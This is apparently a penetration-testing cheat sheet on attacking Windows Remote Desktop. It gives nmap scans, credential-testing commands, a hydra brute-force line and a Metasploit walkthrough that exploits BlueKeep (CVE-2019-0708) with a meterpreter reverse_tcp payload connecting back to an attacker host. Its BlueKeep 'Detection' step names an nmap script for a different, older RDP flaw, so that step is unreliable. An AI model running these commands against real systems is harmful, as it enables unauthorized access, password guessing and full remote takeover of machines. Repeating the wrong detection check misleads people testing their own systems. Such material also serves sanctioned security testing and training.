**RDP** (Remote Desktop Protocol) is a proprietary protocol developed by Microsoft to allow users to remotely connect to and interact with a Windows-based machine using a graphical interface. It operates on port **3389** by default and supports remote desktop, file transfer, and application sharing.


## Check if RDP is Enabled  
Use tools like `nmap` to scan for open RDP ports and confirm the service.  

```bash
nmap -p 3389 --script=rdp-enum-encryption <target>
```

## Testing RDP with Credentials  
`rdesktop`, `xfreerdp`, or `crackmapexec` can be used to validate login credentials for RDP.

**rdesktop**
```bash
rdesktop -u <username> -p <password> <target_ip>
```

**xfreerdp**
```bash
xfreerdp /u:<username> /p:<password> /v:<target_ip>
```

**netexec**
```bash
netexec rdp <target_ip> -u <username> -p <password>
```

## Brute Force Attack on RDP  
`hydra` can be used to brute force RDP credentials.

```bash
hydra -l <username> -P <password_list> rdp://<target_ip>
```

## BlueKeep
**BlueKeep** is a critical vulnerability in the Remote Desktop Protocol (RDP) service of older Windows systems, identified as CVE-2019-0708. This exploit enables unauthenticated attackers to execute remote code on unpatched systems, potentially allowing full control over the affected machine.

#### Affected Systems
- Windows Server Versions:
	- Windows Server 2003 (if RDP is manually enabled)
	- Windows Server 2008 / 2008 R2
- Windows OS Versions:
	- Windows XP (if RDP is enabled)
    - Windows Vista
    - Windows 7

*Note: Systems updated with the May 2019 security patch or later are protected from BlueKeep. Additionally, systems with Network Level Authentication (NLA) enabled are more secure.*

#### Detection

Use Nmap to check for BlueKeep vulnerability:

```bash
nmap -p 3389 --script rdp-vuln-ms12-020 <target_ip>
```

#### **Exploitation**

Once the target is confirmed vulnerable, you can exploit BlueKeep using **Metasploit**:

```bash
msfconsole
search bluekeep
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
# Configure the exploit
set RHOST <target_ip>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT <port>
exploit
```